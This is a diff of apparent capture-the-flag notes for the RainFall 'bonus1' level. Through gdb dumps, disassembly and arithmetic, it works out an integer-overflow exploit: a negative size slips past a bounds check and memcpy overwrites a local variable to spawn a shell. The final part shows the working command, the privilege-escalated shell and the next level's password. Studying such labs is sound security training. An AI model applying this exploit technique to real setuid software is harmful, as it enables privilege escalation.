@@ -95,4 +95,231 @@ undefined4 main(undefined4 param_1,int param_2)
 }
 
 
-use -1
+use -1 => segfault in memcpy -> difficult to exploit
+
+----
+
+size = 9
+9*4 = 36
+
+0x574f4c46
+\x46\x4c\x4f\x57
+
+'\x90' * 40 + '\x46\x4c\x4f\x57'
+
+bonus1@RainFall:~$ python -c "print '\x90' * 40 + '\x46\x4c\x4f\x57'"
+����������������������������������������FLOW
+
+./bonus1 $(python -c "print '9' + ' ' + '\x90' * 40 + '\x46\x4c\x4f\x57'")
+
+bonus1@RainFall:~$ ./bonus1 $(python -c "print '9' + ' ' + '\x90' * 40 + '\x46\x4c\x4f\x57'")
+bonus1@RainFall:~$ 
+
+Breakpoint 1, 0x08048473 in main ()
+(gdb) i reg
+eax            0xbffff6d4	-1073744172
+ecx            0x24	36
+edx            0xbffff8e8	-1073743640
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6c0	0xbffff6c0
+ebp            0xbffff708	0xbffff708
+esi            0x0	0
+edi            0x0	0
+eip            0x8048473	0x8048473 <main+79>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/40x $edx
+0xbffff8e8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff8f8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff908:	0x90909090	0x90909090	0x574f4c46	0x45485300
+0xbffff918:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
+0xbffff928:	0x74783d4d	0x2d6d7265	0x63363532	0x726f6c6f
+0xbffff938:	0x48535300	0x494c435f	0x3d544e45	0x302e3031
+0xbffff948:	0x322e322e	0x37353420	0x34203839	0x00323432
+0xbffff958:	0x5f485353	0x3d595454	0x7665642f	0x7374702f
+0xbffff968:	0x5500302f	0x3d524553	0x756e6f62	0x4c003173
+0xbffff978:	0x4f435f53	0x53524f4c	0x3d73723d	0x69643a30
+(gdb) ni
+0x08048478 in main ()
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048424 <+0>:	push   %ebp
+   0x08048425 <+1>:	mov    %esp,%ebp
+   0x08048427 <+3>:	and    $0xfffffff0,%esp
+   0x0804842a <+6>:	sub    $0x40,%esp
+   0x0804842d <+9>:	mov    0xc(%ebp),%eax
+   0x08048430 <+12>:	add    $0x4,%eax
+   0x08048433 <+15>:	mov    (%eax),%eax
+   0x08048435 <+17>:	mov    %eax,(%esp)
+   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
+   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
+   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
+   0x08048446 <+34>:	jle    0x804844f <main+43>
+   0x08048448 <+36>:	mov    $0x1,%eax
+   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
+   0x0804844f <+43>:	mov    0x3c(%esp),%eax
+   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
+   0x0804845a <+54>:	mov    0xc(%ebp),%eax
+   0x0804845d <+57>:	add    $0x8,%eax
+   0x08048460 <+60>:	mov    (%eax),%eax
+   0x08048462 <+62>:	mov    %eax,%edx
+   0x08048464 <+64>:	lea    0x14(%esp),%eax
+   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
+   0x0804846c <+72>:	mov    %edx,0x4(%esp)
+   0x08048470 <+76>:	mov    %eax,(%esp)
+   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+=> 0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+   0x08048480 <+92>:	jne    0x804849e <main+122>
+   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
+   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
+   0x08048492 <+110>:	movl   $0x8048583,(%esp)
+   0x08048499 <+117>:	call   0x8048350 <execl@plt>
+   0x0804849e <+122>:	mov    $0x0,%eax
+   0x080484a3 <+127>:	leave  
+   0x080484a4 <+128>:	ret    
+End of assembler dump.
+(gdb) x $esp+0x3c
+0xbffff6fc:	0x00000009
+(gdb) x/40x $edx
+0xbffff6f8:	0x080484b9	0x00000009	0x080484b0	0x00000000
+0xbffff708:	0x00000000	0xb7e454d3	0x00000003	0xbffff7a4
+0xbffff718:	0xbffff7b4	0xb7fdc858	0x00000000	0xbffff71c
+0xbffff728:	0xbffff7b4	0x00000000	0x0804821c	0xb7fd0ff4
+0xbffff738:	0x00000000	0x00000000	0x00000000	0xc49fc5be
+0xbffff748:	0xf3d8c1ae	0x00000000	0x00000000	0x00000000
+0xbffff758:	0x00000003	0x08048370	0x00000000	0xb7ff26b0
+0xbffff768:	0xb7e453e9	0xb7ffeff4	0x00000003	0x08048370
+0xbffff778:	0x00000000	0x08048391	0x08048424	0x00000003
+0xbffff788:	0xbffff7a4	0x080484b0	0x08048520	0xb7fed280
+(gdb) x/40x 0xbffff8e8
+0xbffff8e8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff8f8:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff908:	0x90909090	0x90909090	0x574f4c46	0x45485300
+0xbffff918:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
+0xbffff928:	0x74783d4d	0x2d6d7265	0x63363532	0x726f6c6f
+0xbffff938:	0x48535300	0x494c435f	0x3d544e45	0x302e3031
+0xbffff948:	0x322e322e	0x37353420	0x34203839	0x00323432
+0xbffff958:	0x5f485353	0x3d595454	0x7665642f	0x7374702f
+0xbffff968:	0x5500302f	0x3d524553	0x756e6f62	0x4c003173
+0xbffff978:	0x4f435f53	0x53524f4c	0x3d73723d	0x69643a30
+(gdb) x/40x $esp
+0xbffff6c0:	0xbffff6d4	0xbffff8e8	0x00000024	0x080482fd
+0xbffff6d0:	0xb7fd13e4	0x90909090	0x90909090	0x90909090
+0xbffff6e0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff6f0:	0x90909090	0x90909090	0x080484b9	0x00000009
+0xbffff700:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
+0xbffff710:	0x00000003	0xbffff7a4	0xbffff7b4	0xb7fdc858
+0xbffff720:	0x00000000	0xbffff71c	0xbffff7b4	0x00000000
+0xbffff730:	0x0804821c	0xb7fd0ff4	0x00000000	0x00000000
+0xbffff740:	0x00000000	0xc49fc5be	0xf3d8c1ae	0x00000000
+0xbffff750:	0x00000000	0x00000000	0x00000003	0x08048370
+
+
+---
+
+0xbffff6d4 = local3c buffer start
+0xbffff6f8 = local3c buffer End
+0xbffff6fc = local_14
+
+            0x90909090	0x90909090	0x90909090
+0x90909090	0x90909090	0x90909090	0x90909090
+0x90909090	0x90909090	0x080484b9	0x00000009
+
+0xbffff6fc - 0xbffff6d4 = 40
+
+---
+
+2147483647  | 01111111111111111111111111111111
+1           | 0000000000000001
+0           | 0000000000000000
+-1          | 1111111111111111  
+-2147483648 | 10000000000000000000000000000000
+-2147483649 | 10000000000000000000000000000001
+
+
+
+40 = 101000
+10000000000000000000000000101000
+=> atteint le debut de local_14
+
+44 = 101100
+10000000000000000000000000101100
+=> ecrit dans local_14
+==> -2147483604
+
+BUT ATOI  ? -> but no, no security 
+
+(gdb) r -2147483647 aaaa
+Starting program: /home/user/bonus1/bonus1 -2147483647 aaaa
+
+Breakpoint 1, 0x0804843d in main ()
+(gdb) i r
+eax            0x80000001	-2147483647
+ecx            0x0	0
+edx            0x1	1
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6e0	0xbffff6e0
+ebp            0xbffff728	0xbffff728
+esi            0x0	0
+edi            0x0	0
+eip            0x804843d	0x804843d <main+25>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+
+int min * 4 = -2147483648 * 4 = -8589934592
+
+truncated_result = full_product mod 2^N
+
+t = -8589934592 mod 2^32
+t = 0
+
+overflow_offset = k = (full_product - truncated_result) / 2^N
+k = (-8589934592 - 0) / 2^32
+k -2
+
+overflow 2 times
+and overflow of 0 more
+
+-2147483604 * 4 = -8589934416
+
+t = -8589934416 mod 2^32
+t = 176
+
+k = (-8589934416 - 176) / 2^32
+
+overflow 2 times
+and overflow of 176 more -> error wanted overflow of 44 more
+
+-2147483604 = -2147483648 + 44
+44 / 4 = 11
+-2147483637 = -2147483648 + 11
+
+-2147483637 * 4 = -8589934548
+
+t = -8589934548 mod 2^32
+t = 44
+
+succeed
+
+size to enter : -2147483637
+
+
+./bonus1 $(python -c "print '-2147483637' + ' ' + '\x90' * 40 + '\x46\x4c\x4f\x57'")
+
+bonus1@RainFall:~$ ./bonus1 $(python -c "print '-2147483637' + ' ' + '\x90' * 40 + '\x46\x4c\x4f\x57'")
+$ id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$ exit
